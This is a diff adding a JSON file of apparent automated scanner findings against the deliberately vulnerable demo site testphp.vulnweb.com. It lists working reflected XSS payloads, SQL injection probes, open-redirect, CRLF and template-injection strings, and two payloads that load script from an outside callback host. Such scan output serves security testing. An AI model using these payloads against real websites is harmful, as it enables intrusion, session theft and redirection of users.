@@ -1,0 +1,386 @@
+[
+    {
+        "url": "http://testphp.vulnweb.com:80/hpp/?pp=\"onclick=prompt(8)><svg/onload=prompt(8)>\"@x.y",
+        "payload": "XSSVibe"
+    },
+    {
+        "url": "http://testphp.vulnweb.com:80/hpp/index.php?pp=\"onclick=prompt(8)><svg/onload=prompt(8)>\"@x.y",
+        "payload": "XSSVibe"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/hpp/?pp=\"onclick=prompt(8)><svg/onload=prompt(8)>\"@x.y",
+        "payload": "XSSVibe"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p=\"onclick=prompt(8)><svg/onload=prompt(8)>\"@x.y",
+        "payload": "XSSVibe"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/hpp/params.php?aaaa%2f=&p=\"onclick=prompt(8)><svg/onload=prompt(8)>\"@x.y&pp=\"onclick=prompt(8)><svg/onload=prompt(8)>\"@x.y",
+        "payload": "XSSVibe"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%2F%2F%2Fwww.google.com%2F%252f%252e%252e",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%2F%2F%2Fwww.google.com%2F%252f%252e%252e"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=https%3A%2F%2F%255cgoogle.com",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=https%3A%2F%2F%255cgoogle.com"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=+AND+true",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=+AND+true"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=+AND+0",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=+AND+0"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%22",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%22"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=--+or+%23",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=--+or+%23"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%7B%7B%3D+444%2A6664%7D%7D",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%7B%7B%3D+444%2A6664%7D%7D"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%2F%2Fgoogle.com%2F%2F",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%2F%2Fgoogle.com%2F%2F"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%2F%2F%2Fgoogle.com%2F%252f..",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%2F%2F%2Fgoogle.com%2F%252f.."
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%27",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%27"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%2F%2Fgoogle.com%2F",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%2F%2Fgoogle.com%2F"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%2F%2F%2F%2F%255cgoogle.com",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%2F%2F%2F%2F%255cgoogle.com"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%2F%2Fgoogle.com%2F",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%2F%2Fgoogle.com%2F"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%22+OR+1+%3D+1+--+-",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%22+OR+1+%3D+1+--+-"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%27%3D0--%2B",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%27%3D0--%2B"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%60",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%60"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=+AND+false",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=+AND+false"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%27%3D%27",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%27%3D%27"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=1",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=1"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%2F%2Fgoogle.com",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%2F%2Fgoogle.com"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=+HAVING+1%3D1",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=+HAVING+1%3D1"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%2500",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%2500"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%3B",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%3B"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%2Fhttps%3A%2F%2Fgoogle.com%2F",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%2Fhttps%3A%2F%2Fgoogle.com%2F"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%2F%2F%2Fwww.google.com%2F%252e%252e%252f",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%2F%2F%2Fwww.google.com%2F%252e%252e%252f"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=+OR+1%3D0",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=+OR+1%3D0"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=https%3A%2F%2Fgoogle.com%2F%2F",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=https%3A%2F%2Fgoogle.com%2F%2F"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=+AND+1%3D1",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=+AND+1%3D1"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=https%3A%2F%2F%2509%2Fgoogle.com",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=https%3A%2F%2F%2509%2Fgoogle.com"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%2F%2F%2509%2Fgoogle.com",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%2F%2F%2509%2Fgoogle.com"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=+OR+1%3D0%23",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=+OR+1%3D0%23"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%2F%2F%2F%2F%2509%2Fgoogle.com",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%2F%2F%2F%2F%2509%2Fgoogle.com"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%27+or+",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%27+or+"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%2Fhttps%3A%2F%2Fgoogle.com%2F%252f..",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%2Fhttps%3A%2F%2Fgoogle.com%2F%252f.."
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=+AND+1%3D0%23",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=+AND+1%3D0%23"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=+HAVING+1%3D1--",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=+HAVING+1%3D1--"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%2F%2F",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%2F%2F"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=+AND+1%3D0",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=+AND+1%3D0"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%7B%7B444%2A6664%7D%7D",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%7B%7B444%2A6664%7D%7D"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%5Cu560d%5Cu560aDalfoxcrlf%3A+1234",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%5Cu560d%5Cu560aDalfoxcrlf%3A+1234"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%2F%2F%2F%2Fgoogle.com%2F%252f..",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%2F%2F%2F%2Fgoogle.com%2F%252f.."
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%2F%2509%2Fgoogle.com",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%2F%2509%2Fgoogle.com"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%2Fhttps%3A%2F%2F%255cgoogle.com",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%2Fhttps%3A%2F%2F%255cgoogle.com"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%60%60",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%60%60"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=https%3A%2F%2Fgoogle.com%2F%252f..",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=https%3A%2F%2Fgoogle.com%2F%252f.."
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=+HAVING+1%3D0%23",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=+HAVING+1%3D0%23"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%27+OR+%27%27+%3D+%27",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%27+OR+%27%27+%3D+%27"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%250d%250aDalfoxcrlf%3A+1234",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%250d%250aDalfoxcrlf%3A+1234"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%2F%2F%2F%2Fgoogle.com%2F%2F",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%2F%2F%2F%2Fgoogle.com%2F%2F"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%2F%2F%2Fgoogle.com%2F%2F",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%2F%2F%2Fgoogle.com%2F%2F"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%7B444%2A6664%7D",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%7B444%2A6664%7D"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=+OR+1%3D1--",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=+OR+1%3D1--"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=1&pleasedonthaveanamelikethis_plz_plz=DalFox",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=1&pleasedonthaveanamelikethis_plz_plz=DalFox"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=+OR+1%3D1",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=+OR+1%3D1"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=+HAVING+1%3D1%23",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=+HAVING+1%3D1%23"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%2F%2F%2F%2509%2Fgoogle.com",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%2F%2F%2F%2509%2Fgoogle.com"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%2Fhttps%3A%2F%2Fwww.google.com%2F%252e%252e",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%2Fhttps%3A%2F%2Fwww.google.com%2F%252e%252e"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=https%3A%2F%2F%2Fwww.google.com%2F%252e%252e",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=https%3A%2F%2F%2Fwww.google.com%2F%252e%252e"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=+OR+1%3D1%23",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=+OR+1%3D1%23"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=https%3A%2F%2Fgoogle.com",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=https%3A%2F%2Fgoogle.com"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=+HAVING+1%3D0--",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=+HAVING+1%3D0--"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=https%3A%2F%2Fgoogle.com%2F",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=https%3A%2F%2Fgoogle.com%2F"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%2F%2F%2F%2Fwww.google.com%2F%252f%252e%252e",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%2F%2F%2F%2Fwww.google.com%2F%252f%252e%252e"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%3C%23+444%2A6664%3E",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%3C%23+444%2A6664%3E"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%2F%2F%2Fwww.google.com%2F%252f%252e%252e",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%2F%2F%2Fwww.google.com%2F%252f%252e%252e"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%2F%2Fwww.google.com%2F%252f%252e%252e",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%2F%2Fwww.google.com%2F%252f%252e%252e"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%27%27",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%27%27"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%3Cesi%3Aassign+name%3D%22var1%22+value%3D%22dalfox%22%3E%3Cesii-%3Cesi%3Avars+name%3D%22%24%28var1%29%22%3E",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%3Cesi%3Aassign+name%3D%22var1%22+value%3D%22dalfox%22%3E%3Cesii-%3Cesi%3Avars+name%3D%22%24%28var1%29%22%3E"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%2C",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%2C"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=+AND+1%3D1%23",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=+AND+1%3D1%23"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%2F%2Fhttps%3A%2F%2F%2Fwww.google.com%2F%252e%252e",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%2F%2Fhttps%3A%2F%2F%2Fwww.google.com%2F%252e%252e"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%2F%2F%2F%2Fgoogle.com%2F",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%2F%2F%2F%2Fgoogle.com%2F"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%2F%255cgoogle.com",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%2F%255cgoogle.com"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=+AND+1",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=+AND+1"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%2F%2Fgoogle.com%2F%252f..",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%2F%2Fgoogle.com%2F%252f.."
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=+OR+1%3D0--",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=+OR+1%3D0--"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%27+OR+1+--+-",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%27+OR+1+--+-"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?id=%2F%2F%2F%2Fwww.google.com%2F%252e%252e%252f",
+        "payload": "[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%2F%2F%2F%2Fwww.google.com%2F%252e%252e%252f"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/listproducts.php?cat=%3Caudio+controls+ondurationchange%3Dprompt%28calfcrusher%29+id%3Ddalfox%3E%3Csource+src%3D1.mp3+type%3Daudio%2Fmpeg%3E%3C%2Faudio%3E&id=1",
+        "payload": "[POC][V][GET][inHTML-none(1)-URL] http://testphp.vulnweb.com/listproducts.php?cat=%3Caudio+controls+ondurationchange%3Dprompt%28calfcrusher%29+id%3Ddalfox%3E%3Csource+src%3D1.mp3+type%3Daudio%2Fmpeg%3E%3C%2Faudio%3E&id=1"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=&p=%25%3C%2Fscript%3E%3Csvg%3E%3Cscript%2Fclass%3Ddalfox%3Ealert%28calfcrusher%29%3C%2Fscript%3E-%2526apos%3B",
+        "payload": "[POC][V][GET][inHTML-URL] http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=&p=%25%3C%2Fscript%3E%3Csvg%3E%3Cscript%2Fclass%3Ddalfox%3Ealert%28calfcrusher%29%3C%2Fscript%3E-%2526apos%3B"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=&p=%3CscRipt%3Ealert%280x107E91%29%3C%2FscRipt%3E%3CsVg%2Fonload%3Dprompt%28calfcrusher%29%3E&pp=12",
+        "payload": "[POC][R][GET][inHTML-none(1)-URL] http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=&p=%3CscRipt%3Ealert%280x107E91%29%3C%2FscRipt%3E%3CsVg%2Fonload%3Dprompt%28calfcrusher%29%3E&pp=12"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=&p=%3CscRipt%3Ealert%280x107E91%29%3C%2FscRipt%3E&pp=12%22%3E%3Csvg%2FOnLoad%3D%22%60%24%7Bprompt%60%60%7D%60%22%3E",
+        "payload": "[POC][R][GET][inHTML-URL] http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=&p=%3CscRipt%3Ealert%280x107E91%29%3C%2FscRipt%3E&pp=12%22%3E%3Csvg%2FOnLoad%3D%22%60%24%7Bprompt%60%60%7D%60%22%3E"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=&p=%3CscRipt%3Ealert%280x107E91%29%3C%2FscRipt%3E%3CiFrAme%2Fsrc%3DjaVascRipt%3Aprompt%28calfcrusher%29%3E%3C%2FiFramE%3E&pp=12",
+        "payload": "[POC][R][GET][inHTML-none(1)-URL] http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=&p=%3CscRipt%3Ealert%280x107E91%29%3C%2FscRipt%3E%3CiFrAme%2Fsrc%3DjaVascRipt%3Aprompt%28calfcrusher%29%3E%3C%2FiFramE%3E&pp=12"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=&p=%3CscRipt%3Ealert%280x107E91%29%3C%2FscRipt%3E%3CsVg%2Fonload%3Dalert.bind%28%29%28calfcrusher%29+class%3Ddalfox%3E&pp=12",
+        "payload": "[POC][V][GET][inHTML-none(1)-URL] http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=&p=%3CscRipt%3Ealert%280x107E91%29%3C%2FscRipt%3E%3CsVg%2Fonload%3Dalert.bind%28%29%28calfcrusher%29+class%3Ddalfox%3E&pp=12"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=&p=%3CscRipt%3Ealert%280x107E91%29%3C%2FscRipt%3E&pp=12%3CsVg%2Fonload%3Dprompt.valueOf%28%29%28calfcrusher%29+class%3Ddalfox%3E",
+        "payload": "[POC][V][GET][inHTML-none(1)-URL] http://testphp.vulnweb.com/hpp/params.php?aaaa%2F=&p=%3CscRipt%3Ealert%280x107E91%29%3C%2FscRipt%3E&pp=12%3CsVg%2Fonload%3Dprompt.valueOf%28%29%28calfcrusher%29+class%3Ddalfox%3E"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/hpp/?pp=%27%22--%3E%3C%2Fstyle%3E%3C%2FscRipt%3E%3CscRipt+src%3D%22%2F%2Fmv9e8mbvffulk1i0duvujvkdkktmkntnztbb8kejrja%26%2346%3Br87%26%2346%3Bme%22%3E%3C%2FscRipt%3E%3CsVg%2Fonload%3Dalert%28calfcrusher%29%3E",
+        "payload": "[POC][R][GET][inHTML-none(2)-URL] http://testphp.vulnweb.com/hpp/?pp=%27%22--%3E%3C%2Fstyle%3E%3C%2FscRipt%3E%3CscRipt+src%3D%22%2F%2Fmv9e8mbvffulk1i0duvujvkdkktmkntnztbb8kejrja%26%2346%3Br87%26%2346%3Bme%22%3E%3C%2FscRipt%3E%3CsVg%2Fonload%3Dalert%28calfcrusher%29%3E"
+    },
+    {
+        "url": "http://testphp.vulnweb.com/hpp/?pp=%27%22--%3E%3C%2Fstyle%3E%3C%2FscRipt%3E%3CscRipt+src%3D%22%2F%2Fmv9e8mbvffulk1i0duvujvkdkktmkntnztbb8kejrja%26%2346%3Br87%26%2346%3Bme%22%3E%3C%2FscRipt%3E%27%3E%3CsVg%2Fonload%3Dalert%28calfcrusher%29+id%3Ddalfox%3E",
+        "payload": "[POC][V][GET][inHTML-URL] http://testphp.vulnweb.com/hpp/?pp=%27%22--%3E%3C%2Fstyle%3E%3C%2FscRipt%3E%3CscRipt+src%3D%22%2F%2Fmv9e8mbvffulk1i0duvujvkdkktmkntnztbb8kejrja%26%2346%3Br87%26%2346%3Bme%22%3E%3C%2FscRipt%3E%27%3E%3CsVg%2Fonload%3Dalert%28calfcrusher%29+id%3Ddalfox%3E"
+    },
+    {
+        "url": "http://testphp.vulnweb.com:80/hpp/index.php?pp=12%22%22%3E%3CsVg%2Fonload%3Dalert%28calfcrusher%29%3E",
+        "payload": "[POC][R][GET][inATTR-double(3)-URL] http://testphp.vulnweb.com:80/hpp/index.php?pp=12%22%22%3E%3CsVg%2Fonload%3Dalert%28calfcrusher%29%3E"
+    },
+    {
+        "url": "http://testphp.vulnweb.com:80/hpp/index.php?pp=12%22%3E%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dprompt.valueOf%28%29%28calfcrusher%29+class%3Ddalfox%3E",
+        "payload": "[POC][V][GET][inATTR-double(3)-URL] http://testphp.vulnweb.com:80/hpp/index.php?pp=12%22%3E%3Cxmp%3E%3Cp+title%3D%22%3C%2Fxmp%3E%3Csvg%2Fonload%3Dprompt.valueOf%28%29%28calfcrusher%29+class%3Ddalfox%3E"
+    },
+    {
+        "url": "http://testphp.vulnweb.com:80/hpp/?pp=12%22%26%2339%3B%3E%3CScRipt%3Eprint%28calfcrusher%29%3C%2Fscript%3E",
+        "payload": "[POC][R][GET][inATTR-double(3)-URL] http://testphp.vulnweb.com:80/hpp/?pp=12%22%26%2339%3B%3E%3CScRipt%3Eprint%28calfcrusher%29%3C%2Fscript%3E"
+    },
+    {
+        "url": "http://testphp.vulnweb.com:80/hpp/?pp=12%22%22%3E%3Cdalfox+class%3Ddalfox%3E",
+        "payload": "[POC][V][GET][inATTR-double(3)-URL] http://testphp.vulnweb.com:80/hpp/?pp=12%22%22%3E%3Cdalfox+class%3Ddalfox%3E"
+    }
+]
